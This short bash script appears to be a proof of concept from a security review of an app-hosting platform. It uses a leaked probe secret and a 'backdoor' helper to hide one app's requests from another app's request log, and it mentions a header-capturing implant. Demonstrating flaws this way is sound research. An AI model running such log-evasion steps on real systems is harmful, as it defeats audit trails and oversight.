#!/bin/bash
# sec3 S5: every app receives the root-only X-Tando-Probe secret on its health checks (Caddy forwards
# it; the pre-flight probe sends it straight to the app). With it, an app hides its requests to any
# other app from that app's request log. Step 1 needs code in an app process that records request
# headers (see the implant in npmrc-implant.sh); step 2 runs as any app (backdoor x of lib.sh).
set -u; . "$(dirname "$0")/lib.sh"; : "${R:?}" "${HP:?}"; S=${1:?probe secret captured by the app}
x "for i in 1 2 3; do curl -s -o /dev/null -H 'X-Tando-Probe: $S' -H 'Host: bravo.localhost' http://127.0.0.1/hidden-\$i; done"
sleep 3; echo "bravo log lines with /hidden-: $("$R" requests tail bravo -n 500 2> /dev/null | grep -c hidden-) (0 = hidden)"
